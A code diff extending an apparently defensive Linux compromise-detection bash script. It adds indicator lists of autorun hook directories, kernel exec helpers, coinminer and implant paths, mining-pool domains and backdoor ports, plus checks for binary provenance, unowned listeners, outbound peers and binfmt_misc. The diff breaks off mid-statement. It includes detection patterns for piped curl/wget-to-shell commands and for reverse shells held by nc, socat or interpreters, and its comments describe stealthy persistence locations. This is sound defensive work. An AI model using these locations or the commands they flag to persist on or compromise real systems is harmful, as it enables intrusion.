@@ -595,6 +595,181 @@ nxlog
 td-agent
 fluent-bit'
 
+# Directories whose CONTENTS ARE EXECUTED automatically by something other
+# than a user: run-parts hooks, service-manager hooks, network and display
+# hooks, package-manager hooks. Dropping a file in any of these is persistence
+# that survives a review of cron and systemd, because it is neither.
+SIG_AUTORUN_DIR='/etc/network/if-up.d
+/etc/network/if-pre-up.d
+/etc/network/if-down.d
+/etc/network/if-post-down.d
+/etc/networkd-dispatcher/routable.d
+/etc/networkd-dispatcher/off.d
+/etc/networkd-dispatcher/dormant.d
+/etc/networkd-dispatcher/carrier.d
+/etc/dhcp/dhclient-enter-hooks.d
+/etc/dhcp/dhclient-exit-hooks.d
+/etc/dhcpcd.enter-hook
+/etc/dhcpcd.exit-hook
+/etc/systemd/system-sleep
+/lib/systemd/system-sleep
+/usr/lib/systemd/system-sleep
+/etc/systemd/system-shutdown
+/lib/systemd/system-shutdown
+/usr/lib/systemd/system-shutdown
+/etc/systemd/system-generators
+/lib/systemd/system-generators
+/usr/lib/systemd/system-generators
+/etc/systemd/user-generators
+/usr/lib/systemd/user-generators
+/etc/X11/Xsession.d
+/etc/X11/xinit/xinitrc.d
+/etc/X11/xinit/xinput.d
+/etc/gdm3/Init
+/etc/gdm3/PostLogin
+/etc/gdm3/PreSession
+/etc/gdm3/PostSession
+/etc/gdm/Init
+/etc/gdm/PostLogin
+/etc/gdm/PreSession
+/etc/lightdm/lightdm.conf.d
+/etc/kernel/postinst.d
+/etc/kernel/postrm.d
+/etc/kernel/header_postinst.d
+/etc/initramfs/post-update.d
+/etc/initramfs-tools/hooks
+/etc/initramfs-tools/scripts/init-premount
+/etc/initramfs-tools/scripts/local-bottom
+/etc/dpkg/dpkg.cfg.d
+/usr/lib/dpkg/methods
+/etc/apt/apt.conf.d
+/etc/yum/pluginconf.d
+/etc/dnf/plugins
+/etc/rsyslog.d
+/etc/logrotate.d
+/etc/tmpfiles.d
+/run/tmpfiles.d
+/usr/lib/tmpfiles.d
+/etc/modules-load.d
+/usr/lib/modules-load.d
+/etc/sysctl.d
+/usr/lib/sysctl.d
+/etc/binfmt.d
+/usr/lib/binfmt.d
+/etc/ld.so.conf.d
+/etc/profile.d
+/etc/update-motd.d
+/etc/bash_completion.d
+/etc/pm/sleep.d
+/etc/acpi/events
+/etc/acpi/actions
+/etc/cups/interfaces
+/etc/NetworkManager/dispatcher.d
+/etc/NetworkManager/dispatcher.d/pre-up.d
+/etc/NetworkManager/dispatcher.d/pre-down.d'
+
+# Kernel-mediated command execution. The kernel itself runs the program named
+# in each of these, as root, with no service manager and no log entry. They are
+# procfs/sysfs writes, so a runtime change exists nowhere on disk.
+# Format: path|expected-or-empty|severity|description
+SIG_KERNEL_EXEC='/proc/sys/kernel/core_pattern||CRIT|the kernel pipes every core dump to this program, as root
+/proc/sys/kernel/modprobe|/sbin/modprobe|CRIT|the kernel runs this on any request for an unloaded module
+/proc/sys/kernel/poweroff_cmd|/sbin/poweroff|HIGH|run by the kernel on an orderly poweroff
+/sys/kernel/uevent_helper||CRIT|run by the kernel for EVERY device uevent, as root
+/proc/sys/kernel/hotplug||CRIT|legacy hotplug helper, run by the kernel as root
+/proc/sys/fs/binfmt_misc/status||INFO|binfmt_misc master switch'
+
+# Commodity Linux implant and coinminer artefacts. Path presence only - this is
+# IOC matching of the same shallow kind as SIG_RK_PATH, not content scanning.
+SIG_MALWARE_PATH='/etc/rc.d/init.d/network-security
+/usr/bin/bsd-port
+/usr/bin/dpkgd
+/usr/bin/.sshd
+/usr/sbin/.sshd
+/etc/rc.d/init.d/selinux
+/usr/lib/libgcwrap.so
+/usr/local/lib/libprocesshider.so
+/etc/ld.so.preload.bak
+/usr/share/.ssh
+/var/tmp/.X11-unix
+/tmp/.X11-unix/.X0-lock
+/tmp/.ICE-unix/.X0
+/dev/shm/.ssh
+/dev/shm/.pulse
+/usr/bin/kswapd0
+/usr/bin/kdevtmpfsi
+/tmp/kdevtmpfsi
+/var/tmp/kinsing
+/tmp/kinsing
+/usr/bin/xmrig
+/opt/xmrig
+/tmp/.xmrig
+/var/tmp/.xmr
+/tmp/.perfctl
+/usr/bin/perfcc
+/etc/systemd/system/network-monitor.service
+/etc/systemd/system/sysupdate.service
+/usr/local/bin/nginx_module.so
+/var/tmp/.systemd-private
+/usr/bin/mysqld_safe_helper
+/bin/lsof.bak
+/tmp/.hidden
+/var/tmp/.ICE-unix'
+
+# Coinminer indicators in a command line or configuration file. Mining is the
+# single most common payload on a compromised competition host.
+SIG_MINER='stratum[+]tcp://
+stratum[+]ssl://
+stratum2[+]tcp://
+--donate-level
+--cpu-priority
+--coin=monero
+--algo=(rx|cn|randomx)
+xmrig
+xmr-stak
+minerd
+cpuminer
+ccminer
+nicehash
+supportxmr[.]com
+minexmr[.]com
+nanopool[.]org
+pool[.]minergate
+moneroocean[.]stream
+hashvault[.]pro
+c3pool[.]com'
+
+# Default listen ports of commodity backdoors, handlers and reverse shells.
+# A weak signal alone - these are also ordinary high ports - so it only ever
+# contributes evidence to a listener that is already being scored.
+SIG_BADPORT='1337
+1524
+2222
+3127
+3128
+4444
+4445
+5555
+6666
+6667
+7777
+8888
+9001
+9090
+9999
+10000
+12345
+20034
+27374
+31337
+31338
+32764
+33890
+45678
+54321
+60000
+63000'
+
 # Cron / unit command patterns that indicate remote-fetch or obfuscated exec.
 # Extended regex, fed to awk. A literal single-quote is written [\047].
 SIG_BADCMD='(curl|wget|fetch)[^|;&]*[|][[:space:]]*(ba)?sh|\
@@ -685,6 +860,7 @@ hex2ip6() {
 # ---------------------------------------------------------------------------
 CAP_ROOT=0 CAP_PROC=0 CAP_FIND_PRINTF=0 CAP_STAT=0 CAP_PS=0
 CAP_SS=0 CAP_NETSTAT=0 CAP_SYSTEMCTL=0 CAP_LSATTR=0 CAP_HASH=""
+CAP_OD=0 CAP_PKGQ=""
 IN_CONTAINER=0 DISTRO_ID="" DISTRO_LIKE=""
 
 probe_toolbox() {
@@ -703,6 +879,29 @@ probe_toolbox() {
     have netstat   && CAP_NETSTAT=1
     have systemctl && CAP_SYSTEMCTL=1
     have lsattr    && CAP_LSATTR=1
+
+    # Byte reader for the ELF/packer scan. Probe BEHAVIOR: busybox od exists
+    # but may lack -v/-t, which silently collapses repeated bytes and destroys
+    # the entropy measurement.
+    case "$(printf 'AA' | od -An -v -tu1 -N2 2>/dev/null)" in
+        *65*65*) CAP_OD=1 ;;
+    esac
+
+    # Package-ownership query. Probe behaviour on a path the manager must own
+    # - its own binary - because a pruned container database answers nothing
+    # for paths that really are packaged, and a stub dpkg answers nothing at
+    # all. Offline roots are excluded: the host database does not describe the
+    # mounted image.
+    if [[ -z $ROOT ]]; then
+        local _self
+        if have dpkg-query && _self=$(command -v dpkg-query) &&
+           run_bounded 5 dpkg-query -S "$_self" >/dev/null 2>&1; then
+            CAP_PKGQ=dpkg
+        elif have rpm && _self=$(command -v rpm) &&
+             run_bounded 5 rpm -qf "$_self" >/dev/null 2>&1; then
+            CAP_PKGQ=rpm
+        fi
+    fi
 
     local h
     for h in sha256sum shasum sha1sum md5sum cksum; do
@@ -768,7 +967,7 @@ run_check() {
 
 emit_sig_tables() {
     local t v
-    for t in RK_PATH RK_SYM SUID_NEVER SUID_OK AGENT INTERESTING; do
+    for t in RK_PATH RK_SYM SUID_NEVER SUID_OK AGENT INTERESTING MALWARE_PATH BADPORT; do
         eval "local _tbl=\$SIG_$t"
         while IFS= read -r v; do
             [[ -n $v ]] && _join SIG "$t" "$v"
@@ -855,6 +1054,7 @@ col_proc() {
 
 declare -A SOCK_PID=()      # socket inode -> pid
 declare -a LISTEN_ROWS=()   # proto|addr|port|uid|inode
+declare -a CONN_ROWS=()     # proto|laddr|lport|raddr|rport|uid|inode
 
 col_net() {
     if [[ ! -r $PROCFS/net/tcp ]]; then
@@ -902,6 +1102,9 @@ col_net() {
                     remote=${rem_a%%:*}; remote_port=$(hex2port "${rem_a##*:}")
                     if [[ $proto == tcp6 ]]; then remote=$(hex2ip6 "$remote"); else remote=$(hex2ip "$remote"); fi
                     obs CONNECTION "$proto:$addr:$port" "$remote:$remote_port|pid=${SOCK_PID[$inode]:-unknown}"
+                    if (( ${#CONN_ROWS[@]} < 5000 )); then
+                        CONN_ROWS+=("$proto|$addr|$port|$remote|$remote_port|$uid|$inode")
+                    fi
                     case $remote in 127.*|10.*|192.168.*|172.1[6-9].*|172.2[0-9].*|172.3[01].*|169.254.*|::1|fc*:*|fd*:*|fe80:*|::ffff:127.*|::ffff:10.*|::ffff:192.168.*) ;;
                         *) finding NET022 INFO network possible "Established connection to a non-private peer" "$remote:$remote_port" "local=$addr:$port owner_pid=${SOCK_PID[$inode]:-unknown}; direction/intent not established" review_network ;;
                     esac
@@ -915,6 +1118,245 @@ col_net() {
             done
         } < "$PROCFS/net/$f"
     done
+}
+
+
+# --- provenance -------------------------------------------------------------
+# "Does any package own this binary?" is a different question from
+# `dpkg --verify` ("are the packaged files still intact?"), and on a managed
+# distro it is the higher-yield one: an implant is never in the package
+# database, however well it is named or placed.
+#
+# Populated in the PARENT shell alongside col_proc/col_net, because checks run
+# inside run_bounded subshells and cannot publish state back to their caller.
+declare -A EXE_PKG=()       # exe path -> owning package, or "-" when unknown name
+declare -A EXE_UNOWNED=()   # exe path -> 1 when NO package claims it
+declare -A UNOWNED_HINT=()  # rpm only: paths its stderr named as unowned
+PROV_STATE=""               # "" until col_prov runs, then "ok" or a skip reason
+
+# Absorb one manager's answer for one batch. The asked-about paths arrive as
+# arguments, the answer on stdin.
+#
+# The direction matters: ownership is only ever recorded from a POSITIVE
+# answer. Everything asked about and not positively claimed is unowned. A
+# manager that errors, times out or is trojaned therefore produces "unowned"
+# (investigate) rather than "owned" (ignore) - the safe direction for a
+# detector.
+prov_absorb() {
+    local mgr=$1; shift
+    local line path pkg
+    local -A owned=()
+    while IFS= read -r line; do
+        case $mgr in
+            dpkg)
+                # "pkg: /path", "pkg1, pkg2: /path", "diversion by x from: /path"
+                case $line in
+                    diversion*|"local diversion"*) continue ;;
+                    *": /"*) pkg=${line%%": /"*}; path=/${line#*": /"} ;;
+                    *) continue ;;
+                esac
+                owned[$path]=${pkg%%,*}
+                ;;
+            rpm)
+                # rpm cannot echo the queried path back in a query format, so
+                # the negative lines (on stderr, merged by the caller) are what
+                # identify unowned paths; everything else was owned.
+                case $line in
+                    "file "*" is not owned by any package")
+                        path=${line#file }; path=${path%" is not owned by any package"}
+                        UNOWNED_HINT[$path]=1 ;;
+                esac
+                ;;
+        esac
+    done
+    local alt
+    for path in "$@"; do
+        case $mgr in
+            dpkg)
+                if [[ -n ${owned[$path]:-} ]]; then
+                    EXE_PKG[$path]=${owned[$path]}
+                else
+                    # /proc/PID/exe always resolves to the merged-/usr form
+                    # (/usr/bin/ls), but a database written before usrmerge, or
+                    # by a package that still ships /bin paths, records the
+                    # other spelling. Without this retry every such binary
+                    # reads as unowned - a false-positive flood, which is worse
+                    # than no check at all.
+                    alt=""
+                    case $path in
+                        /usr/bin/*|/usr/sbin/*|/usr/lib/*|/usr/lib64/*) alt=${path#/usr} ;;
+                        /bin/*|/sbin/*|/lib/*|/lib64/*) alt=/usr$path ;;
+                    esac
+                    if [[ -n $alt && -n ${owned[$alt]:-} ]]; then
+                        EXE_PKG[$path]=${owned[$alt]}
+                    else
+                        EXE_PKG[$path]='-'; EXE_UNOWNED[$path]=1
+                    fi
+                fi
+                ;;
+            rpm)
+                if [[ -n ${UNOWNED_HINT[$path]:-} ]]; then
+                    EXE_PKG[$path]='-'; EXE_UNOWNED[$path]=1
+                else
+                    EXE_PKG[$path]=owned
+                fi
+                ;;
+        esac
+    done
+}
+
+col_prov() {
+    if [[ -n $ROOT ]]; then
+        PROV_STATE="offline root: the host package database does not describe the mounted image"
+        return
+    fi
+    if [[ $OPT_MODE != full ]]; then
+        PROV_STATE="package-ownership query reserved for --full (one manager fork per 64 binaries)"
+        return
+    fi
+    if (( CAP_PROC == 0 )); then
+        PROV_STATE="no live process table; nothing to resolve ownership for"
+        return
+    fi
+    if [[ -z $CAP_PKGQ ]]; then
+        PROV_STATE="no working dpkg-query -S / rpm -qf; binary provenance UNKNOWN, not clean"
+        return
+    fi
+
+    local pid exe
+    local -a want=()
+    local -A seen=()
+    for pid in "${PROC_PIDS[@]}"; do
+        exe=${PROC_EXE[$pid]:-}
+        [[ -n $exe ]] || continue
+        exe=${exe%" (deleted)"}
+        # A memfd or anonymous exe has no filesystem path to own; chk_provenance
+        # reports those on their own terms rather than as a package miss.
+        case $exe in
+            /*) ;;
+            *) continue ;;
+        esac
+        # dpkg-query -S treats its argument as a glob. A path carrying shell
+        # metacharacters would query something other than itself, so it is
+        # reported as indeterminate instead of silently mismatched.
+        case $exe in
+            *'*'*|*'?'*|*'['*) EXE_PKG[$exe]='?'; continue ;;
+        esac
+        [[ -n ${seen[$exe]:-} ]] && continue
+        seen[$exe]=1
+        want+=("$exe")
+    done
+    if (( ${#want[@]} == 0 )); then
+        PROV_STATE="no resolvable process executables"
+        return
+    fi
+
+    local i start=$SECONDS
+    local -a batch=()
+    for ((i=0; i<${#want[@]}; i+=64)); do
+        if (( SECONDS - start >= STAGE_SECONDS )); then
+            PROV_STATE="package-ownership budget exceeded after $i of ${#want[@]} executables; remainder UNKNOWN"
+            return
+        fi
+        batch=("${want[@]:i:64}")
+        case $CAP_PKGQ in
+            dpkg) local -a ask=() ; local a
+                  for a in "${batch[@]}"; do
+                      ask+=("$a")
+                      case $a in
+                          /usr/bin/*|/usr/sbin/*|/usr/lib/*|/usr/lib64/*) ask+=("${a#/usr}") ;;
+                          /bin/*|/sbin/*|/lib/*|/lib64/*) ask+=("/usr$a") ;;
+                      esac
+                  done
+                  prov_absorb dpkg "${batch[@]}" \
+                    < <(run_bounded 10 dpkg-query -S "${ask[@]}" 2>/dev/null) ;;
+            rpm)  prov_absorb rpm  "${batch[@]}" \
+                    < <(run_bounded 10 rpm -qf "${batch[@]}" 2>&1) ;;
+        esac
+    done
+    # Implausibility gate. On a managed distro almost every running executable
+    # is packaged; a large unowned fraction means the database does not
+    # describe this filesystem (a converted or pruned database, a container
+    # image, a chroot), not that the host is full of implants. Reporting forty
+    # HIGH findings in that situation buries the real one, so the honest answer
+    # is that provenance could not be established.
+    local total=0 miss=0
+    for exe in "${!EXE_PKG[@]}"; do
+        total=$((total + 1))
+        [[ -n ${EXE_UNOWNED[$exe]:-} ]] && miss=$((miss + 1))
+    done
+    if (( total >= 10 && miss * 100 / total > 40 )); then
+        PROV_STATE="$miss of $total running executables unowned ($CAP_PKGQ); that ratio means the package database does not describe this filesystem, so ownership is UNRELIABLE and was not scored"
+        EXE_PKG=(); EXE_UNOWNED=()
+        return
+    fi
+    for exe in "${!EXE_PKG[@]}"; do
+        obs PROVENANCE "$exe" "${EXE_PKG[$exe]}"
+    done
+    PROV_STATE=ok
+}
+
+# --- shared classifiers -----------------------------------------------------
+
+# Directories a packaged, long-lived daemon is never installed under. Being
+# here is not proof of anything on its own; it is one input to the scores in
+# chk_unowned_listener and chk_outbound.
+is_transient_path() {
+    case $1 in
+        # Judged by is_user_path instead. A dot-directory is only a signal
+        # OUTSIDE a home: ~/.local/bin and ~/.cargo/bin are where pip, pipx and
+        # cargo install things, while /usr/lib/.x or /var/.hidden is hiding.
+        /home/*|/root/*) return 1 ;;
+        /tmp/*|/var/tmp/*|/dev/shm/*|/run/shm/*|/dev/mqueue/*|\
+        /var/spool/*|/var/www/*|/srv/*/tmp/*|memfd:*|/memfd:*) return 0 ;;
+        */.*/*) return 0 ;;
+    esac
+    return 1
+}
+
+# Home directories are a weaker signal than /tmp and kept separate from it.
+# On a server a daemon running out of /home is worth a look; on a workstation
+# it is a language-manager install, an AppImage or a development server, and
+# weighting it like /dev/shm turns every developer's box into a CRIT.
+is_user_path() {
+    case $1 in
+        /home/*|/root/*) return 0 ;;
+    esac
+    return 1
+}
+
+# RFC1918 and friends, plus the ranges col_net's inline case misses: CGNAT,
+# multicast, benchmarking and the unspecified address.
+is_private_ip() {
+    case $1 in
+        0.0.0.0|127.*|10.*|192.168.*|169.254.*|\
+        172.1[6-9].*|172.2[0-9].*|172.3[01].*|\
+        100.6[4-9].*|100.[7-9][0-9].*|100.1[01][0-9].*|100.12[0-7].*|\
+        198.1[89].*|22[4-9].*|23[0-9].*|24[0-9].*|25[0-5].*) return 0 ;;
+        ::|::1|fc??:*|fd??:*|fe80:*|ff0?:*) return 0 ;;
+        ::ffff:127.*|::ffff:10.*|::ffff:192.168.*|::ffff:172.1[6-9].*) return 0 ;;
+    esac
+    return 1
+}
+
+# systemd places every managed process in a .service/.socket/.scope cgroup. A
+# listening daemon with no unit was started by something other than the service
+# manager. Sets PROC_UNIT to a unit name, "none", or "unknown" - and "unknown"
+# must never be scored as "none", which is why a non-systemd host reports
+# "unknown" for every process rather than implicating all of them.
+PROC_UNIT=unknown
+proc_unit() {
+    PROC_UNIT=unknown
+    [[ ${PROC_COMM[1]:-} == systemd ]] || return 0
+    local f=$PROCFS/$1/cgroup line
+    [[ -r $f ]] || return 0
+    PROC_UNIT=none
+    while IFS= read -r line; do
+        case $line in
+            *.service|*.socket|*.scope|*.mount) PROC_UNIT=${line##*/}; return 0 ;;
+        esac
+    done < "$f"
+    return 0
 }
 
 # ---------------------------------------------------------------------------
@@ -1785,6 +2227,907 @@ END {
 }
 AWKEOF
 
+
+# --- M20: binary provenance -------------------------------------------------
+# Unowned is not the same as malicious: /usr/local, pip, npm, Go and anything
+# compiled on the box are all legitimately unowned. Severity therefore tracks
+# WHERE the unowned binary lives - inside the package manager's own
+# territory (/usr/bin, /bin, /sbin) nothing should be unowned at all.
+chk_provenance() {
+    [[ $PROV_STATE == ok ]] || { skip PRV000 "${PROV_STATE:-provenance collector did not run}"; return; }
+    local exe pkg n=0 unowned=0 agent a
+    for exe in "${!EXE_PKG[@]}"; do
+        pkg=${EXE_PKG[$exe]}
+        n=$((n + 1))
+        [[ $pkg == '?' ]] && {
+            finding PRV004 LOW provenance possible \
+                "Executable path contains glob metacharacters; ownership not queried" \
+                "$exe" "querying it would match a different path" inspect_file
+            continue
+        }
+        [[ -n ${EXE_UNOWNED[$exe]:-} ]] || continue
+        unowned=$((unowned + 1))
+
+        # An agent binary that no package owns is agent tampering, not a
+        # suspicious process. Report it as such and never as "remove this".
+        agent=0
+        while IFS= read -r a; do
+            [[ -n $a ]] || continue
+            case ${exe##*/} in "$a"|"$a"?*) agent=1 ;; esac
+        done <<< "$SIG_AGENT"
+        if (( agent )); then
+            finding PRV020 CRIT integrity likely \
+                "Security agent binary is owned by no package - possible agent replacement" \
+                "$exe" "${CAP_PKGQ:-package manager} reports no owning package; compare with the vendor package before trusting this agent's telemetry" \
+                verify_agent
+            continue
+        fi
+
+        case $exe in
+            /usr/bin/*|/usr/sbin/*|/bin/*|/sbin/*|/usr/libexec/*|/usr/lib/*|/usr/lib64/*)
+                finding PRV001 HIGH provenance likely \
+                    "Running executable inside a package-managed directory that no package owns" \
+                    "$exe" "${CAP_PKGQ:-package manager} reports no owner; nothing in this directory should be unpackaged" \
+                    inspect_file ;;
+            /tmp/*|/var/tmp/*|/dev/shm/*|/run/*|/var/www/*|/var/spool/*)
+                finding PRV002 HIGH provenance likely \
+                    "Running executable in a transient or world-writable directory, owned by no package" \
+                    "$exe" "${CAP_PKGQ:-package manager} reports no owner" inspect_file ;;
+            *)
+                finding PRV003 LOW provenance possible \
+                    "Running executable owned by no package" \
+                    "$exe" "${CAP_PKGQ:-package manager} reports no owner; locally built and language-manager installs land here legitimately" \
+                    inspect_file ;;
+        esac
+    done
+    ok PRV000 "$n running executables resolved against $CAP_PKGQ; $unowned owned by no package"
+}
+
+# --- M21: unowned / unmanaged listeners -------------------------------------
+# chk_services recognises services BY NAME, so it can only ever confirm what
+# the host is supposed to run. This check is its inverse: it scores every
+# listener on attributes the kernel reports, so a listener that matches no
+# name at all is exactly the thing that surfaces rather than the thing that
+# is skipped.
+chk_unowned_listener() {
+    if (( ${#LISTEN_ROWS[@]} == 0 )); then
+        ok LSN000 "no listening sockets to attribute"
+        return
+    fi
+    (( CAP_PROC == 1 )) || { skip LSN000 "no live process table; listeners cannot be attributed to executables"; return; }
+
+    local row proto addr port uid ino pid exe comm cwd score why sev conf n=0 scored=0
+    local agent a deleted
+    local -A done=()
+    for row in "${LISTEN_ROWS[@]}"; do
+        IFS='|' read -r proto addr port uid ino <<< "$row"
+        pid=${SOCK_PID[$ino]:-}
+        n=$((n + 1))
+        if [[ -z $pid || $pid == '?' ]]; then
+            # NET010 already covers the rootkit reading of an unattributable
+            # socket. Here it only means the score cannot be computed.
+            continue
+        fi
+        # One process may hold many listening sockets; score it once.
+        [[ -n ${done[$pid]:-} ]] && continue
+        done[$pid]=1
+
+        exe=${PROC_EXE[$pid]:-}
+        comm=${PROC_COMM[$pid]:-}
+        deleted=0
+        case $exe in *" (deleted)") deleted=1; exe=${exe%" (deleted)"} ;; esac
+        case $exe in memfd:*|/memfd:*) deleted=1 ;; esac
+
+        agent=0
+        while IFS= read -r a; do
+            [[ -n $a ]] || continue
+            [[ $comm == "${a:0:15}" ]] && agent=1
+        done <<< "$SIG_AGENT"
+        (( agent )) && continue
+
+        # "hard" signals are the ones with no benign reading at all. One is
+        # required before this check will say CRIT, so that placement and unit
+        # membership - both of which have ordinary explanations - can raise a
+        # listener for review but never convict it on their own.
+        score=0; why=""; local hard=0
+        if (( deleted )); then
+            hard=1; score=$((score + 3)); why="$why; executable is deleted or memfd-backed"
+        fi
+        if [[ -n $exe ]] && is_transient_path "$exe"; then
+            score=$((score + 3)); why="$why; executable lives in a transient path"
+        elif [[ -n $exe ]] && is_user_path "$exe"; then
+            score=$((score + 2)); why="$why; executable lives under a home directory"
+        fi
+        if [[ $PROV_STATE == ok && -n $exe ]]; then
+            if [[ -n ${EXE_UNOWNED[$exe]:-} ]]; then
+                hard=1; score=$((score + 3)); why="$why; no package owns the executable"
+            fi
+        else
+            why="$why; provenance UNKNOWN ($PROV_STATE)"
+        fi
+        proc_unit "$pid"
+        case $PROC_UNIT in
+            # A root daemon outside every unit was started by something other
+            # than the service manager. A user process outside one is just a
+            # program someone ran, which is why the weight differs by uid.
+            none) if [[ $uid == 0 ]]; then
+                      score=$((score + 2)); why="$why; root process is in no systemd unit"
+                  else
+                      score=$((score + 1)); why="$why; process is in no systemd unit"
+                  fi ;;
+            unknown) why="$why; unit membership unknown" ;;
+        esac
+        case $addr in
+            127.*|::1) ;;
+            *) score=$((score + 1)); why="$why; bound beyond loopback ($addr)" ;;
+        esac
+        # Only a mismatch in BOTH directions is masquerading. The kernel
+        # truncates comm to 15 bytes, and plenty of programs set a longer
+        # descriptive name than their binary - "zen" running as "zen-browser".
+        if [[ -n $exe && -n $comm && ${exe##*/} != "$comm"* && $comm != "${exe##*/}"* ]]; then
+            score=$((score + 1)); why="$why; process name and executable basename are unrelated"
+        fi
+        cwd=$(readlink "$PROCFS/$pid/cwd" 2>/dev/null) || cwd=""
+        if [[ -n $cwd ]] && is_transient_path "$cwd"; then
+            score=$((score + 1)); why="$why; working directory is $cwd"
+        fi
+
+        # Threshold 3: one weak signal on its own is never a finding.
+        (( score >= 3 )) || continue
+        scored=$((scored + 1))
+        if   (( score >= 6 && hard == 1 )); then sev=CRIT; conf=likely
+        elif (( score >= 4 ));              then sev=HIGH; conf=possible
+        else                                     sev=MED;  conf=possible
+        fi
+        finding LSN001 "$sev" services "$conf" \
+            "Listening service that matches no known service profile" \
+            "$proto $addr:$port pid=$pid ${comm:-?}" \
+            "exe=${exe:-unknown} uid=$uid score=$score${why}" \
+            review_unknown_service
+    done
+    ok LSN000 "$n listening sockets attributed; $scored scored above the reporting threshold"
+}
+
+# --- M22: outbound peers ----------------------------------------------------
+# A reverse shell or beacon binds nothing, so for that whole implant class the
+# outbound connection is the only network evidence there is. col_net already
+# inventories every non-private peer at INFO; this check raises the ones whose
+# owning process also fails provenance, placement or service-manager tests.
+chk_outbound() {
+    if (( ${#CONN_ROWS[@]} == 0 )); then
+        [[ -r $PROCFS/net/tcp ]] && { ok NET023 "no established connections observed"; return; }
+        skip NET023 "no $PROCFS/net - outbound connections UNKNOWN"
+        return
+    fi
+    (( CAP_PROC == 1 )) || { skip NET023 "no live process table; outbound peers cannot be attributed"; return; }
+
+    local row proto laddr lport raddr rport uid ino pid exe comm score why sev conf deleted
+    local ext=0 raised=0 agent a
+    local -A done=()
+    for row in "${CONN_ROWS[@]}"; do
+        IFS='|' read -r proto laddr lport raddr rport uid ino <<< "$row"
+        is_private_ip "$raddr" && continue
+        ext=$((ext + 1))
+        pid=${SOCK_PID[$ino]:-}
+        [[ -n $pid && $pid != '?' ]] || continue
+        [[ -n ${done[$pid:$raddr]:-} ]] && continue
+        done[$pid:$raddr]=1
+
+        exe=${PROC_EXE[$pid]:-}
+        comm=${PROC_COMM[$pid]:-}
+        deleted=0
+        case $exe in *" (deleted)") deleted=1; exe=${exe%" (deleted)"} ;; esac
+        case $exe in memfd:*|/memfd:*) deleted=1 ;; esac
+
+        agent=0
+        while IFS= read -r a; do
+            [[ -n $a ]] || continue
+            [[ $comm == "${a:0:15}" ]] && agent=1
+        done <<< "$SIG_AGENT"
+        (( agent )) && continue
+
+        score=0; why=""; local hard=0
+        if (( deleted )); then
+            hard=1; score=$((score + 3)); why="$why; executable is deleted or memfd-backed"
+        fi
+        if [[ -n $exe ]] && is_transient_path "$exe"; then
+            score=$((score + 3)); why="$why; executable lives in a transient path"
+        elif [[ -n $exe ]] && is_user_path "$exe"; then
+            score=$((score + 2)); why="$why; executable lives under a home directory"
+        fi
+        if [[ $PROV_STATE == ok && -n $exe && -n ${EXE_UNOWNED[$exe]:-} ]]; then
+            hard=1; score=$((score + 3)); why="$why; no package owns the executable"
+        elif [[ $PROV_STATE != ok ]]; then
+            why="$why; provenance UNKNOWN ($PROV_STATE)"
+        fi
+        proc_unit "$pid"
+        case $PROC_UNIT in
+            none) if [[ $uid == 0 ]]; then
+                      score=$((score + 2)); why="$why; root process is in no systemd unit"
+                  else
+                      score=$((score + 1)); why="$why; process is in no systemd unit"
+                  fi ;;
+            unknown) why="$why; unit membership unknown" ;;
+        esac
+        # A shell or interpreter holding an external socket is the reverse-shell
+        # shape; a packaged daemon holding one is ordinary.
+        case ${exe##*/} in
+            bash|sh|dash|zsh|ksh|python*|perl|ruby|php|lua|nc|ncat|netcat|socat|busybox)
+                score=$((score + 2)); why="$why; peer is held by a shell or interpreter" ;;
+        esac
+
+        (( score >= 3 )) || continue
+        raised=$((raised + 1))
+        if   (( score >= 6 && hard == 1 )); then sev=CRIT; conf=likely
+        elif (( score >= 4 ));              then sev=HIGH; conf=possible
+        else                                     sev=MED;  conf=possible
+        fi
+        finding NET024 "$sev" network "$conf" \
+            "Outbound connection to a non-private peer from an unattributable process" \
+            "$raddr:$rport" \
+            "local=$laddr:$lport pid=$pid ${comm:-?} exe=${exe:-unknown} score=$score${why}; direction and intent are not established by this check" \
+            review_network
+    done
+    ok NET023 "$ext connections to non-private peers examined; $raised raised above inventory level"
+}
+
+# --- M23: binfmt_misc interpreter registrations -----------------------------
+# Registering an interpreter means the kernel silently hands every execve() of
+# a matching file to the attacker's binary. It is written through a procfs
+# file, so a registration made at runtime exists nowhere on disk and survives
+# every configuration audit that only reads /etc.
+chk_binfmt() {
+    local d="$PROCFS/sys/fs/binfmt_misc"
+    local f name line interp flags enabled magic n=0
+    if [[ ! -d $d ]]; then
+        ok BFM000 "binfmt_misc is not mounted; no interpreter registrations are possible"
+        return
+    fi
+    if [[ ! -r $d ]]; then
+        skip BFM000 "binfmt_misc mounted but unreadable; interpreter registrations UNKNOWN"
+        return
+    fi
+    for f in "$d"/*; do
+        name=${f##*/}
+        case $name in register|status|'*') continue ;; esac
+        [[ -r $f ]] || { skip BFM000 "registration $name unreadable"; continue; }
+        interp=""; flags=""; enabled=""; magic=""
+        while IFS= read -r line; do
+            case $line in
+                enabled|disabled) enabled=$line ;;
+                "interpreter "*) interp=${line#interpreter } ;;
+                "flags:"*) flags=${line#flags:}; flags=${flags# } ;;
+                "magic "*) magic=${line#magic } ;;
+                "extension "*) magic="extension ${line#extension }" ;;
+            esac
+        done < "$f"
+        n=$((n + 1))
+        obs BINFMT "$name" "${enabled:-?}|${interp:-?}|${flags:-none}|${magic:0:64}"
+        [[ $enabled == enabled ]] || continue
+
+        # 'C' and 'O' run the interpreter with the *target's* credentials and
+        # with the target pre-opened - the combination an attacker wants
+        # against a SUID file.
+        local note=""
+        case $flags in *C*) note="$note; flag C: interpreter inherits the target's credentials" ;; esac
+        case $flags in *O*) note="$note; flag O: target is pre-opened for the interpreter" ;; esac
+        case $flags in *F*) note="$note; flag F: interpreter held open by the kernel, survives mount-namespace changes" ;; esac
+
+        if [[ -z $interp ]]; then
+            finding BFM003 MED persistence possible "binfmt_misc registration with no readable interpreter" \
+                "$name" "enabled; magic=${magic:0:64}$note" review_binfmt
+            continue
+        fi
+        case $interp in
+            /usr/bin/*|/usr/sbin/*|/bin/*|/sbin/*|/usr/libexec/*|/usr/lib/*|/usr/lib64/*|/opt/*)
+                case $name in
+                    qemu-*|jar|python*|cli|llvm-*|wine|DOSCmd|mono|python3*|jexec)
+                        finding BFM004 INFO persistence confirmed "binfmt_misc registration" \
+                            "$name" "interpreter=$interp flags=${flags:-none}$note" - ;;
+                    *)
+                        finding BFM002 MED persistence possible \
+                            "Unrecognised binfmt_misc registration with a system interpreter" \
+                            "$name" "interpreter=$interp flags=${flags:-none} magic=${magic:0:64}$note" \
+                            review_binfmt ;;
+                esac ;;
+            *)
+                finding BFM001 HIGH persistence likely \
+                    "binfmt_misc interpreter outside the system binary directories" \
